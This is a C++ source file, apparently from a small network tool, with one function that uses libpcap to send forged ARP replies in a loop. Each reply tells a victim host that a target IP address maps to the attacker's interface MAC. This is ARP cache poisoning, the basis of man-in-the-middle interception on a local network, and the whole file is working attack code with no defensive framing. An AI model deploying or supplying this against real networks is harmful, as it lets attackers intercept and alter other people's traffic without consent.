#include <iostream>
#include <string>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "node.h"
using namespace std;

void send_arp(Node *sender, Node *target){
	extern int status;
        pcap_t *handle;
	char *errbuf = NULL;
        handle = pcap_open_live(sender->iface.c_str(), BUFSIZ, 0, 1000, errbuf);
        if (handle == NULL){
                cout << errbuf << endl;
                exit(0);
        }
        
	unsigned char packet[100];
        unsigned int i=0;
        u_char ether_type[] = { 0x08, 0x06 };           // ARP
        u_char Hardware_Type[] = { 0x00,0x01 };         // ETHERNET
        u_char Protocol_Type[] = { 0x08,0x00 };         
        u_char Hardware_Size[] = { 0x06 };		// ETHERNET
        u_char Protocol_Size[] = { 0x04 };		
        u_char Opcode[] = { 0x00, 0x02 };               // ARP Reply

        memcpy(packet + i, sender->mac_addr, sizeof(sender->mac_addr));			//sender mac
        i += sizeof(sender->mac_addr);
        memcpy(packet + i, sender->iface_mac_addr, sizeof(sender->iface_mac_addr));     // src mac
        i += sizeof(sender->iface_mac_addr);
        memcpy(packet + i, ether_type, sizeof(ether_type));
        i += sizeof(ether_type);
        memcpy(packet + i, Hardware_Type, sizeof(Hardware_Type));
        i += sizeof(Hardware_Type);
        memcpy(packet + i, Protocol_Type, sizeof(Protocol_Type));
        i += sizeof(Protocol_Type);
        memcpy(packet + i, Hardware_Size, sizeof(Hardware_Size));
        i += sizeof(Hardware_Size);
        memcpy(packet + i, Protocol_Size, sizeof(Protocol_Size));
        i += sizeof(Protocol_Size);
        memcpy(packet + i, Opcode, sizeof(Opcode));
        i += sizeof(Opcode);
        memcpy(packet + i, sender->iface_mac_addr, sizeof(sender->iface_mac_addr));     // sender_mac
        i += sizeof(sender->iface_mac_addr);
        memcpy(packet + i, target->ip_addr, sizeof(target->ip_addr));
        i += sizeof(target->ip_addr);
        memcpy(packet + i, sender->mac_addr, sizeof(sender->mac_addr));             //traget mac
        i += sizeof(sender->mac_addr);
        memcpy(packet + i, sender->ip_addr, sizeof(sender->ip_addr));       //target ip
        i += sizeof(sender->ip_addr);
	
	while(1) {
		if(status == 0)
			break;
		pcap_sendpacket(handle, packet, i);
		cout << "[*] Send "<< " ARP reply packet to " << sender->ip_addr_str << endl;
		sleep(2);
	}
	return;
}
